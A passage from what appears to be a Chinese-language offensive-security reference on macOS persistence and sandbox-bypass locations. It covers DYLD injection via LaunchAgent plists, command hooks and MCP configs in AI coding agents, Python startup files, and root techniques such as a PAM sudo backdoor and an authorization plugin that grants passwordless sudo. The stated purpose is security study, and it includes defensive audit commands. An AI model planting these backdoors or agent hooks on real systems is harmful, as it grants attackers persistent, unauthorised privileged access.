- 可用于绕过沙箱：[🔴](https://emojipedia.org/large-red-circle)
  - dyld 会对 SIP/platform 二进制文件、启用了 hardened runtime 的应用以及 setuid 目标**剥除** `DYLD_*`，因此只会向未受保护的进程注入，且**不会**绕过 SIP/hardened runtime
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 可靠方式：在恶意 `LaunchAgent`/`LaunchDaemon` plist 内的 **`EnvironmentVariables`** 字典中设置（在登录/启动时运行）
- 已失效/历史方式（仅供报告记录）：**`~/.MacOSX/environment.plist`**（在 10.8 中移除）和 **`/etc/launchd.conf`**（在 10.10 中移除）

#### 描述与利用

如果攻击者能将 `DYLD_INSERT_LIBRARIES` 写入受害进程的环境变量，dyld 就会将攻击者的 dylib 加载到该进程中（并运行其 constructor）。持久化变体会将该变量嵌入 LaunchAgent 中，使任务每次启动时都会重新注入。请注意，在现代 macOS 上，`launchctl setenv DYLD_*` 会被过滤，因此应将其嵌入 plist 中。<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

有关 dylib injection/hijacking 的完整机制，请参阅：

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI 编码 Agent CLI（hooks、MCP servers、规则文件）

相关文章：[CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>，[规则文件后门 (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 需要开发者使用相关 Agent。当 Agent 接受其配置时，启动命令会以该用户的权限运行；各产品和会话模式下，工作区信任机制与 MCP 审批要求有所不同。
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)（以用户身份运行；继承终端/Agent 已有的权限）

#### 位置

显式配置的 hook 和 MCP 文件可能会导致**开发者使用工具时运行 shell 命令或子进程**——配置可以来自按用户设置的全局文件（持久化），也可以来自提交到仓库中的文件（供应链攻击）。`CLAUDE.md`、`AGENTS.md`、`GEMINI.md` 和编辑器规则是**提供给 Agent 的指令**，并不保证读取时会执行 shell 命令；其效果取决于 Agent 的行为和工具权限。请检查各产品当前的信任与审批规则。

- **Claude Code**
  - `~/.claude/settings.json`、项目中的 `.claude/settings.json`、`.claude/settings.local.json`，以及仅限 root 修改的 **`/Library/Application Support/ClaudeCode/managed-settings.json`**（MDM/托管设置**不能被用户覆盖** → 强持久化）
  - `hooks` 对象 — 事件 `PreToolUse`、`PostToolUse`、`UserPromptSubmit`、`Stop`、`SubagentStop`、`SessionStart`、`SessionEnd`、`Notification`、`PreCompact` — 每个事件都会运行 shell `command`
  - `statusLine.command` — 执行 shell 命令以呈现状态栏（每个会话都会运行）
  - `~/.claude.json` / 项目 `.mcp.json` 中的 MCP servers — 作为子进程启动 `command`+`args`
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — 其中的指令可能尝试 prompt injection，其效果取决于 Agent 的行为和工具权限
- **OpenAI Codex CLI**：`~/.codex/config.toml` 中的 `[mcp_servers.*]`（将 `command`/`args` 作为子进程启动）；项目指令 `AGENTS.md`
- **Gemini CLI**：`~/.gemini/settings.json`（`hooks`、MCP servers）；`GEMINI.md`
- **Cursor**：`~/.cursor/hooks.json`（`beforeShellExecution`、`afterAgentResponse`、`stop`、…运行命令）；`.cursor/rules/`、`.cursorrules`、`~/.cursor/mcp.json`；GitHub Copilot 的 `.github/copilot-instructions.md`

#### 描述与利用

如果攻击者能够修改该账户的用户全局设置，其 hook 或 MCP 命令便可在该账户后续的会话中运行。由仓库控制的配置则是另一种情况：[Claude Code 当前的安全文档](https://code.claude.com/docs/en/security)说明，系统会显示交互式工作区信任对话框，并对项目 `.mcp.json` servers 单独显示审批提示。[其权限矩阵](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder)指出，父文件夹获信任后，hooks 可以运行；`claude -p`/SDK 会话不会显示交互式信任提示；在这些非交互模式下，项目 MCP servers 无需审批提示即可连接。CVE-2025-59536 报告的信任前项目 hook 绕过已于[2025 年修复](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)；不要将其视为当前默认行为。投递途径可能包括受感染的仓库或恶意安装程序。规则文件 prompt injection 的确定性较低，且仍取决于工具审批。<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Claude Code 用户全局设置示例；仅在一次性账户中进行测试时使用：

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

用户全局 Codex MCP 配置示例：

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Cursor hook 配置示例；使用前请检查其已安装版本的 schema：

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser Extensions（Chromium：Chrome / Brave / Edge）

说明：[Chrome 外部扩展](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>、[macOS 上滥用 ExtensionInstallForcelist](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- 有助于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 需要使用受支持的浏览器，并安装且启用扩展。macOS 上的 External Extensions 需要用户确认；托管强制安装则需要适用的企业策略。
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> 这与 **native messaging hosts** 不同（参见上文的 *Chrome native messaging hosts* 一节）。这里的持久化对象是**自动安装的扩展**本身。

#### 位置

- **External Extensions JSON**（浏览器启动时检测，之后 macOS 会提示用户是否启用）：
  - Chrome：`~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json`（每用户）或 `/Library/Application Support/Google/Chrome/External Extensions/`（所有用户）
  - Brave：`~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge：`~/Library/Application Support/Microsoft Edge/External Extensions/`
- 通过托管偏好设置 / 配置描述文件实施的**企业策略强制安装**：
  - `com.google.Chrome` 键 `ExtensionInstallForcelist`（Brave 使用 `com.brave.Browser`，Edge 使用 `com.microsoft.Edge`），从 `/Library/Managed Preferences/` 或已安装的 `.mobileconfig` 中读取

#### 说明与利用

这是两种不同的安装途径。Chrome 的[外部安装文档](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)说明，通过 *External Extensions* 文件提供的扩展，**Windows 和 macOS 用户必须确认并启用**；仅仅写入该 JSON 文件并不会执行扩展。对于 macOS 上面向所有用户的安装，Chrome 还要求外部扩展文件受到保护，避免非特权用户修改。托管的 `ExtensionInstallForcelist` 或 `ExtensionSettings` 策略可以在无需用户交互的情况下安装并固定扩展；[Google 的 Mac 策略指南](https://support.google.com/chrome/a/answer/7517624)介绍了托管配置，并说明用户无法移除强制安装的扩展。这是策略部署途径，而非针对单个用户的 `defaults write` 捷径。<sup>[[49]](#references)</sup>

> [!WARNING]
> 在 macOS 上，*External Extensions* JSON 清单必须指向 **Chrome Web Store** 更新 URL，而不能指向本地 CRX。托管策略部署有自己的企业前提条件，并且可能允许使用托管的自托管更新 URL。在测试配置文件中加载本地未打包扩展时，Chrome 的开发者模式 `--load-extension=/path` 开关是另一种独立机制，并不会使 External Extensions JSON 文件自动执行。不要将写入 `Secure Preferences` 视为等同于上述任一种文档所述的注册途径。

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

在该一次性账户中启动 Chrome 并观察启用提示；用户接受后，扩展自身的行为即构成执行 PoC。测试结束后，从该配置文件中移除 manifest，并停用或卸载扩展。在研究用 Mac 上的活动 Chrome 配置文件中**未**测试此路径。该设备上也未部署 managed-policy 路径。

Force-install 和 External Extensions 引用的是 **Chrome Web Store** 扩展 ID；关于通过编辑配置文件中经 HMAC 签名的 `Secure Preferences` 静默注入本地扩展这一更底层的技巧，以及其他 Chromium 进程滥用方式，请参阅：

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL Scheme 与文件类型处理程序（LaunchServices）

文章：[通过自定义 URL Scheme 远程利用 Mac（Objective-See）](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 触发方式是受害者点击链接（例如在 Chrome/Brave/Safari 中），或打开已注册类型的文件
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- App bundle 的 `Info.plist` 声明 **`CFBundleURLTypes`/`CFBundleURLSchemes`**（自定义 URL scheme）或 **`CFBundleDocumentTypes`**（文件扩展名/UTI）
- 每用户生效的默认设置可能位于 **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`**（`LSHandlers` 数组）中。Apple 提供的 URL scheme 默认处理程序设置 API 是 `LSSetDefaultHandlerForURLScheme`；直接写入该 plist 并不是有文档记录的注册或缓存更新方法。

#### 描述与利用

Launch Services 从已注册 App 的 `Info.plist` 中获取 URL scheme 和文档类型声明。[Apple 的注册指南](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) 指出，注册可能发生在 Finder 发现 App 时、启动或登录时，或通过显式注册 API 完成；仅仅将 App 写入某个位置，并不能保证立即触发注册。注册后，打开匹配的 URL 或文档可能会启动被选中的处理程序 App，但这取决于用户选择的默认处理程序以及 macOS 的常规启动检查。受支持的 `LSSetDefaultHandlerForURLScheme` API 会更改用户偏好的 URL 处理程序；它不会让新放入的 App 自动执行。<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 研究用 Mac 上没有注册任何应用，也没有更改任何处理程序偏好设置。要测试实际的处理程序，请使用一次性用户帐户，注册一个仅包含标记功能且使用唯一 scheme 的应用，调用其 URL，然后移除该应用及其注册信息。

有关深入枚举/滥用文件扩展名和 URL scheme 处理程序的信息，请参阅：

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python 启动文件（`.pth` / `usercustomize` / `sitecustomize`）

说明：[https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- 有助于 bypass sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 相关 Python interpreter 启动且启用了该 site directory 时运行；此触发方式并不适用于所有 virtual environments、Python builds 或启动 flags
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
  - 以启动该 interpreter 的进程所拥有的 privileges/TCC 运行

#### 位置

- **`$(python3 -m site --user-site)/*.pth`**（macOS framework builds：`~/Library/Python/<X.Y>/lib/python/site-packages/`）
  - 无需 root（用户可写）
  - **触发条件**：该 Python build 启动且启用了其 user site；`site` module 会处理 active site directories 中的 `.pth` files
- **`<user-site>/usercustomize.py`**
  - 无需 root
  - **触发条件**：启用 user site 时启动（由 `site` 自动导入）
- **`<prefix>/site-packages/sitecustomize.py`**（例如 `/opt/homebrew/lib/python3.13/site-packages/` 或系统路径）
  - 根据 interpreter 的位置，可能需要 root/admin
  - **触发条件**：包含该 site directory 的 interpreter 启动

#### 描述与利用

启动时，Python 通常会导入 `site`，并扫描其 active `site-packages` directories 中的 `.pth` files。除了添加路径之外，以 `import ` 开头的 `.pth` 行还会执行 Python 代码，即使其中指定的 module 在其他地方从未被使用。Python 也会尝试导入 `sitecustomize`，并且**在启用 user site 时**导入 `usercustomize`。<sup>[[56]](#references)</sup> 触发条件是之后启动一个能够看到已修改目录的 interpreter。`-S` 会禁用 `site` 处理；`-s`、`-I` 或 `PYTHONNOUSERSITE` 会禁用 **user-site** 变体。`-I` 通常不会禁用全局 `sitecustomize`。Virtual environments 也可能排除 user site。请针对特定 interpreter 检查 `python3 -m site`。

以下 PoC 在 macOS 26.5.2 上运行。此测试中，`PYTHONUSERBASE` 会将 user site 移到临时目录；不会修改真实的 user site：

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

两个标记都出现了。在此测试中，使用 `-s`、`-I` 或 `-S` 重复测试后，两个 **user-site** 标记都没有出现。未测试全局 site 目录中的 `sitecustomize`。

## Root Sandbox Bypass

> [!TIP]
> 在这里，你可以找到适用于 **sandbox bypass** 的启动位置：只需**将内容写入文件**即可执行，并且需要是 **root** 和/或满足其他**特殊条件**。

### Periodic

> [!CAUTION]
> **历史机制：**在 macOS 26.5.2 测试机器上，`/usr/sbin/periodic`、`/etc/defaults/periodic.conf`、`/etc/periodic` 和 `com.apple.periodic-*` launch daemons 均不存在。不要假设在当前系统上创建 `/etc/periodic` 就能调度其中的内容。在使用下方示例前，请先确认目标版本中存在该命令和已启用的调度程序。

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- 可用于 sandbox bypass：[🟠](https://emojipedia.org/large-orange-circle)
  - 但需要 root
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- `/etc/periodic/daily`、`/etc/periodic/weekly`、`/etc/periodic/monthly`、`/usr/local/etc/periodic`
  - 需要 root
  - **触发时机**：到达相应时间时
- `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local`
  - 需要 root
  - **触发时机**：到达相应时间时

#### 描述与利用

在较早的版本中，periodic 脚本（**`/etc/periodic`**）由 `/System/Library/LaunchDaemons/com.apple.periodic*` 中的 **launch daemons** 调度。从 macOS Big Sur 11.5 开始，periodic runner 会以每个文件的**所有者**身份执行 periodic 目录中的脚本，堵住了一条此前可导致权限提升的路径。<sup>[[27]](#references)</sup>以下命令和目录列表是历史输出，并非 macOS 26.5.2 测试结果。

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

还有其他定期执行的脚本，相关配置见 **`/etc/defaults/periodic.conf`**：

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

在安装并启用了 `periodic` 及其 launch daemons 的旧系统上，`/etc/daily.local`、`/etc/weekly.local` 和 `/etc/monthly.local` 是额外的执行路径。一个无害的只读检查是：

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> 基于所有者的规则适用于周期性目录中的脚本。历史上的 `999.local` 包装脚本会 source `/etc/daily.local`、`/etc/weekly.local` 或 `/etc/monthly.local`，但不会执行相同的所有权检查；当调度程序以 root 身份运行时，这些本地文件也会以 root 身份运行。关于这一差异以及 Big Sur 11.5 中的变更，请参阅[原始研究](https://theevilbit.github.io/beyond/beyond_0019/)。如果 `periodic` 不存在，不应假定这些路径处于活动状态。

### PAM

文章：[Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
文章：[https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但你需要是 root
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 始终需要 root

#### 描述与利用

由于 PAM 更侧重于**持久化**和恶意软件，而不是在 macOS 中轻松执行操作，本文不会详细解释，**请阅读相关文章以更好地理解此技术**。<sup>[[28]](#references)</sup>

使用以下命令检查 PAM modules：

```bash
ls -l /etc/pam.d
```

一种滥用 PAM 的持久化/权限提升技术很简单：修改模块 /etc/pam.d/sudo，并在文件开头添加以下行：

```bash
auth       sufficient     pam_permit.so
```

所以它**看起来**会像这样：

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

因此，任何使用 **`sudo` 的尝试都会成功**。

> [!CAUTION]
> 请注意，此目录受 TCC 保护，因此用户很可能会看到请求访问权限的提示。

另一个很好的例子是 su，你可以看到也可以向 PAM 模块传递参数（你也可以后门化这个文件）：

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- 可用于绕过 sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - 但你需要 root，并进行额外配置
- TCC bypass: ???

#### 位置

- `/Library/Security/SecurityAgentPlugins/`
  - 需要 root 权限
  - 还需要配置 authorization database 才能使用该插件

#### 描述与利用

你可以创建一个 authorization plugin，在用户登录时执行，以维持持久化。有关如何创建此类插件的更多信息，请查看前面的 writeup（并注意，编写不当的插件可能会导致你无法登录，届时你需要在 recovery mode 下清理 Mac）。<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**将 bundle 移动到要加载的位置：**

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

最后添加用于加载此插件的**规则**：

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** 会告知授权框架需要**调用外部机制进行授权**。此外，**`privileged`** 会使其以 root 身份执行。

通过以下方式触发：

```bash
security authorize com.asdf.asdf
```

然后，**staff 组应具有 sudo** 访问权限（读取 `/etc/sudoers` 以确认）。

### Man.conf

Writeup：[https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但你需要 root 权限，而且用户必须使用 man
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/private/etc/man.conf`**
  - 需要 root 权限
  - **`/private/etc/man.conf`**：每当使用 man 时

#### 描述与利用

配置文件 **`/private/etc/man.conf`** 指定了打开 man 文档文件时要使用的二进制文件/脚本。因此，可以修改可执行文件的路径，这样用户每次使用 man 阅读文档时，都会执行一个后门。<sup>[[31]](#references)</sup>

例如，在 **`/private/etc/man.conf`** 中设置：

```
MANPAGER /tmp/view
```

然后将 `/tmp/view` 创建为：

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- 可用于绕过 sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但需要 root 权限，并且 Apache 必须正在运行
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)
  - Httpd 没有 entitlements

#### 位置

- **`/etc/apache2/httpd.conf`**
  - 需要 root 权限
  - 触发条件：Apache2 启动时

#### 描述与利用

你可以在 `/etc/apache2/httpd.conf` 中指定加载一个模块，方法是添加如下行：<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

这样，你编译的模块就会由 Apache 加载。唯一需要做的是：**使用有效的 Apple 证书对其签名**，或者在系统中**添加新的受信任证书**，并**使用该证书对其签名**。

然后，如果需要确保服务器启动，可以执行：

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb 的代码示例：

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit 框架

文章：[https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- 可用于 bypass sandbox：[🟠](https://emojipedia.org/large-orange-circle)
  - 但你需要 root 权限、auditd 正在运行，并触发一条警告
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`/etc/security/audit_warn`**
  - 需要 root 权限
  - **触发条件**：auditd 检测到警告时

#### 描述与 Exploit

每当 auditd 检测到警告时，都会**执行**脚本 **`/etc/security/audit_warn`**。因此，你可以将 payload 添加到该脚本中。<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

你可以使用 `sudo audit -n` 强制触发警告。

### 启动项

> [!CAUTION] > **此功能已弃用，因此这些目录中不应存在任何内容。**

**StartupItem** 是一个目录，应位于 `/Library/StartupItems/` 或 `/System/Library/StartupItems/` 中。创建此目录后，其中必须包含两个特定文件：

1. **rc script**：在启动时执行的 shell 脚本。
2. **plist 文件**，文件名必须为 `StartupParameters.plist`，其中包含各种配置设置。

确保 rc script 和 `StartupParameters.plist` 文件都正确放置在 **StartupItem** 目录中，以便启动过程能够识别并使用它们。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 我在自己的 macOS 系统中找不到这个组件，因此如需了解更多信息，请查看 writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple 引入的 **emond** 是一种日志记录机制，似乎尚未充分开发，或可能已被弃用，但仍可访问。对于 Mac 管理员来说，这项不起眼的服务并无太大用处，但 threat actor 可能会将其用作隐蔽的持久化方式，而且大多数 macOS 管理员很可能不会注意到它。<sup>[[34]](#references)</sup>

对于了解 **emond** 存在的人来说，识别其任何恶意用途都很简单。该服务的系统 LaunchDaemon 会在单个目录中查找要执行的脚本。可以使用以下命令进行检查：

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup：[https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### 位置

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - 需要 root 权限
  - **触发条件**：使用 XQuartz 时

#### 描述与利用

macOS **已不再安装 XQuartz**，因此如需了解更多信息，请查看 writeup。<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> 安装 kext 非常复杂，即使拥有 root 权限也是如此，因此除非你有 exploit，否则这不被视为实用的 sandbox-escape 或 persistence 技术。

#### 位置

要将 KEXT 安装为启动项，必须将其**安装在以下位置之一**：

- `/System/Library/Extensions`
  - 内置于 OS X 操作系统的 KEXT 文件。
- `/Library/Extensions`
  - 由第三方软件安装的 KEXT 文件

你可以使用以下命令列出当前已加载的 kext 文件：

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

有关 [**kernel extensions，请查看此部分**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers) 的更多信息。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### 位置

- **`/usr/local/bin/amstoold`**
  - 需要 root 权限

#### 描述与利用

据说，`plist` `/System/Library/LaunchAgents/com.apple.amstoold.plist` 会使用这个二进制文件，同时暴露一个 XPC service……问题是这个二进制文件并不存在，因此你可以在该位置放置某个文件；当 XPC service 被调用时，你的二进制文件就会被调用。<sup>[[35]](#references)</sup>

我在自己的 macOS 中已经找不到它了。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### 位置

- **`/Library/Preferences/Xsan/.xsanrc`**
  - 需要 root 权限
  - **触发条件**：服务运行时（很少发生）

#### 描述与利用

据说这个脚本并不常运行，而且我在自己的 macOS 中甚至找不到它；如需更多信息，请查看 writeup。<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **这在现代版本的 MacOS 中不起作用**

也可以在此处放置**将在启动时执行的命令**。例如，常规 rc.common 脚本如下：

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

